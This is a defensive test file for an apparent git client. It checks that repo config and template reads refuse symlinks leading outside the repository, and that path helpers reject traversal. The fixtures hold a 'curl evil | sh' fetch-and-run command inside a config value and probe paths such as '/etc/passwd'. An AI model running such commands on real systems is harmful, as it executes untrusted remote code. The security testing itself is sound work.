import { mkdirSync, mkdtempSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, describe, expect, it } from 'vitest';
import { getPatchForFiles, readWorktree, toFsPath } from '../src/main/git/diff';
import { ReviewService } from '../src/main/ai/review';
import { discoverIssueTemplates } from '../src/main/gh/issue-templates';
import { findPullRequestTemplate } from '../src/main/gh/pr-template';
import { readRepoConfig } from '../src/main/repo/config';
import { assertInsideRepo, readRepoFile } from '../src/main/repo/paths';
import type { WorkingFile } from '../src/shared/types';

const SECRET = 'TOP-SECRET-OUTSIDE-THE-REPO';
const dirs: string[] = [];
afterEach(() => {
  for (const d of dirs.splice(0)) rmSync(d, { recursive: true, force: true });
});

/** A repo directory plus a sibling file outside it holding SECRET. */
function setup(): { repo: string; outside: string } {
  const base = mkdtempSync(join(tmpdir(), 'gg-symlink-'));
  dirs.push(base);
  const repo = join(base, 'repo');
  mkdirSync(repo);
  const outside = join(base, 'outside.txt');
  writeFileSync(outside, SECRET);
  return { repo, outside };
}

describe.skipIf(process.platform === 'win32')('repo files never follow symlinks out of the repository', () => {
  it('review guidelines ignore a CONTRIBUTING.md symlinked to a file outside the repo', async () => {
    const { repo, outside } = setup();
    symlinkSync(outside, join(repo, 'CONTRIBUTING.md'));
    const service = new ReviewService(null as never, null as never, null as never, null as never, null as never, repo);
    expect(await service['guidelines'](repo)).toBeNull();
  });

  it('review guidelines still read a regular file', async () => {
    const { repo } = setup();
    writeFileSync(join(repo, 'CONTRIBUTING.md'), 'Be nice.');
    const service = new ReviewService(null as never, null as never, null as never, null as never, null as never, repo);
    expect(await service['guidelines'](repo)).toContain('Be nice.');
  });

  it('refuses a file reached through a symlinked directory that leaves the repo', async () => {
    const { repo } = setup();
    const base = join(repo, '..');
    mkdirSync(join(base, 'elsewhere'));
    writeFileSync(join(base, 'elsewhere', 'review.md'), SECRET);
    symlinkSync(join(base, 'elsewhere'), join(repo, '.gitgood'));
    expect(await readRepoFile(repo, '.gitgood/review.md')).toBeNull();
  });

  it('PR template, issue templates and .gitgood/config.json ignore symlinks', async () => {
    const { repo } = setup();
    const base = join(repo, '..');
    writeFileSync(join(base, 'tpl.md'), SECRET);
    writeFileSync(join(base, 'cfg.json'), JSON.stringify({ postResolveCheck: 'curl evil | sh' }));
    mkdirSync(join(repo, '.github'));
    symlinkSync(join(base, 'tpl.md'), join(repo, '.github', 'pull_request_template.md'));
    symlinkSync(join(base, 'tpl.md'), join(repo, '.github', 'ISSUE_TEMPLATE.md'));
    mkdirSync(join(repo, '.gitgood'));
    symlinkSync(join(base, 'cfg.json'), join(repo, '.gitgood', 'config.json'));
    expect(await findPullRequestTemplate(repo)).toBeNull();
    expect(await discoverIssueTemplates(repo)).toEqual([]);
    expect(await readRepoConfig(repo)).toEqual({ postResolveCheck: null, ai: true });
  });

  it('an untracked symlink diffs as its link text, not the target contents', async () => {
    const { repo, outside } = setup();
    symlinkSync(outside, join(repo, 'link'));
    expect((await readWorktree(repo, 'link'))?.toString()).toBe(outside);
    const file: WorkingFile = { path: 'link', oldPath: null, status: 'untracked', staged: false, conflict: null } as unknown as WorkingFile;
    const { patch } = await getPatchForFiles(null as never, repo, [file], 100_000);
    expect(patch).toContain(outside);
    expect(patch).not.toContain(SECRET);
  });
});

describe('toFsPath / assertInsideRepo', () => {
  it('rejects parent traversal and absolute paths, accepts nested relative ones', () => {
    const repo = join(tmpdir(), 'gg-repo');
    expect(() => toFsPath(repo, '../x')).toThrow();
    expect(() => toFsPath(repo, 'a/../../x')).toThrow();
    expect(() => toFsPath(repo, '/etc/passwd')).toThrow();
    expect(toFsPath(repo, 'src/a.ts')).toBe(join(repo, 'src', 'a.ts'));
  });

  it.skipIf(process.platform === 'win32')('rejects a write target below a symlinked directory that leaves the repo', async () => {
    const { repo } = setup();
    const out = join(repo, '..', 'outdir');
    mkdirSync(out);
    symlinkSync(out, join(repo, 'link'));
    await expect(assertInsideRepo(repo, toFsPath(repo, 'link/new/file.txt'))).rejects.toThrow();
    await expect(assertInsideRepo(repo, toFsPath(repo, 'fresh/dir/file.txt'))).resolves.toBeUndefined();
  });
});
